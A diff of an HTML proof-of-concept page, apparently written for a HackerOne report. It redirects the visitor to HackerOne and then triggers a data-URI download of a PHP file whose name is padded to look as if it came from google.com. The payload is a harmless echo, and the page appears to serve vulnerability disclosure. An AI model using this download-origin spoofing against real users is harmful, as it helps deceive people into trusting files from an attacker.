@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Concealed Download</title>
+  <title>Concealed PHP Download</title>
   <style>
     body {
       height: 100vh;
@@ -24,33 +24,37 @@
 
 <h1>
   Tap anywhere.<br>
-  You will be redirected to HackerOne first, then the file will be downloaded.
+  You will be redirected to HackerOne first, then the PHP file will be downloaded.
 </h1>
 
 <script>
 document.addEventListener('click', () => {
-  // Step 1: Create "legitimate" file content (e.g., a dummy file content for download)
-  const payload = 'This is some dummy content for the zip file.';
-  
-  // Create a Data URI for the content (this will be treated as a zip file for download)
-  const dataUri = `data:application/zip;base64,${btoa(payload)}`;
-  
-  // Create an <a> tag to trigger the download
-  const a = document.createElement('a');
-  a.href = dataUri;
-  a.download = 'document.zip'; // Suggested filename (ZIP file)
-  document.body.appendChild(a);
-  a.click(); // Trigger the download
+  // Step 1: Redirect to HackerOne first
+  location.href = 'https://hackerone.com'; 
 
-  // Clean up after triggering the download
+  // Step 2: After 3 seconds, trigger file download
   setTimeout(() => {
-    a.remove(); // Clean up the <a> element
-  }, 1000);
-  
-  // Step 2: Redirect to HackerOne after the download has started (after a brief delay)
-  setTimeout(() => {
-    location.href = 'https://hackerone.com';
-  }, 500); // Delay redirect slightly to ensure the download begins
+    // Create PHP content with embedded URL ("from: google.com")
+    const payload = '<?php echo "This file is from: google.com"; ?>';
+
+    // Encode the PHP content to Base64
+    const encodedPayload = btoa(payload);
+
+    // Create a Data URI for the content (this will be treated as a PHP file for download)
+    const dataUri = `data:text/php;base64,${encodedPayload}`;
+
+    // Create an <a> tag to trigger the download
+    const a = document.createElement('a');
+    a.href = dataUri;
+    a.download = 'document.php_________________from https://google.com'; // Suggested filename (.php file)
+    document.body.appendChild(a);
+    a.click(); // Trigger the download
+
+    // Clean up after triggering the download
+    setTimeout(() => {
+      a.remove(); // Clean up the <a> element
+    }, 1000);
+  }, 3000); // Wait 3 seconds after redirect to trigger the download
 }, { once: true });
 </script>
 
